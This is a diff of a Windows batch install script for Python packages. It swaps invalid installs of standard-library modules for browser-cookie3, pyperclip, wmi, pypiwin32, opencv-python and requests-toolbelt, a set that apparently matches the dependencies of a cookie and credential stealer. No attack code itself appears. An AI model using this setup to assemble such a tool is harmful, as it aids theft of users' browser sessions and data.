@@ -12,29 +12,27 @@ pip install colorama
 
 pip install pystyle
 
-pip install logging
+pip install cryptography
 
-pip install subprocess
+pip install opencv-python
 
-pip install customtkinter
+pip install psutil
 
-pip install shutil
+pip install pycountry
 
-pip install base64
+pip install pyperclip
 
-pip install sqlite3
+pip install pypiwin32
 
-pip install socket
+pip install requests
 
-pip install zipfile
+pip install requests-toolbelt
 
-pip uninstall crypto 
+pip install wmi
 
-pip uninstall pycrypto
+pip install pyaesm
 
-pip install pycryptodome
-
-pip install win32crypt
+pip install browser-cookie3
 
 cls
 color 2
